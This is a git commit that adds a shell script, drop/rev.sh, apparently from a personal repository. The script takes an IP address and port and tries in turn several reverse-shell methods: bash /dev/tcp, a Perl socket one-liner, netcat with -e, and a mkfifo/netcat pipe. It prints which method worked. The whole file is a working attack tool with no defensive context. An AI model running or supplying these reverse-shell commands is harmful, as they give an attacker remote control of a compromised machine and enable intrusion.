9ac24b4c1e797f957a405c2c4fc37b520af8835b
haltosan <32181538+haltosan@users.noreply.github.com>
2019-07-01 22:31:00 +0000

    Add files via upload

---
+++ drop/rev.sh
@@ -0,0 +1,17 @@
+echo "**starting**"
+#ip port
+{ 
+	bash -i >& /dev/tcp/$1/$2 0>&1 && echo "Method: bash"
+}
+|| { 
+	perl -e 'use Socket;$i="'$1'";$p='$2';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' && echo "Method: perl"  
+}
+|| {
+       	nc -e /bin/sh $1 $2 && echo "Method: netcat" 
+}
+|| {
+       	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f && echo "Method: alt netcat"  
+}
+|| {
+       	echo "All methods failed" 
+}
